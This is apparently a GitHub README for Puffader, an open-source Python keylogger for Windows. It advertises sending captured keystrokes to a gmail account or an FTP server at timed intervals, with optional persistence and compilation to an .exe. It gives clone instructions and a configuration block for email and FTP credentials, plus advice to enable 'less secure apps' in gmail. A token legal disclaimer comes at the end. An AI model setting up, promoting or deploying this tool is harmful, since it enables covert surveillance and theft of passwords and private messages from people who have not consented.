[![Build status](https://ci.appveyor.com/api/projects/status/5tc6085mmmw6rym8?svg=true)](https://ci.appveyor.com/project/xp4xbox/puffader)
# Puffader
Puffader is an opensource, email/ftp sending keylogger for windows written in python3. Puffader can easily be configured to send messages over ftp or email as well be configured for specific times to send logs, etc.

## Installation
Puffader Requires:
* [Python3](https://www.python.org/downloads)
* [Pyhook](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook)
* [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)

Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Installing-Prerequisites) for more information on installing prerequisites.

The program can be downloaded via github or git eg.
```git clone https://github.com/xp4xbox/Puffader.git```

## Features
Currently Puffader has several features such as:
* Ability to send logs to any gmail account.
* Ability to send logs via ftp
* Ability to configure log size before sending
* Ability to send logs at timed intervals
* Ability to control how you want the backspace key to be outputed as.
* Ability to stop the program via ctrl-rshift-h.
* Ability to log special characters.
* Optional persistence.
* Checking for multiple instances
* And more...

## Quick Usage

1. Open file with idle or any other editor.
2. Modifiy lines 12-27 for your personal preference: eg.
```
strEmailAc = "email@gmail.com"
strEmailPass = "pass"

blnFTP = "False"
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 1000

blnUseTime = "True"
strTimePerSend = 120

blnBackRemove = "True"
```

#### NOTE: If you plan to send messages via email, be sure to [allow access for less secure apps](https://myaccount.google.com/lesssecureapps) in your gmail account.

For more information please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki).

### Building File To .exe, Using Persistence, etc.

Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki).

## Help

If you need any help at all, feel free to post a "help" issue.

## Contributing

Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.

## Disclaimer

This program must be used for legal purposes! I am not responsible for anything you do with it.

## License
[License](https://github.com/xp4xbox/Puffader/blob/master/LICENSE)
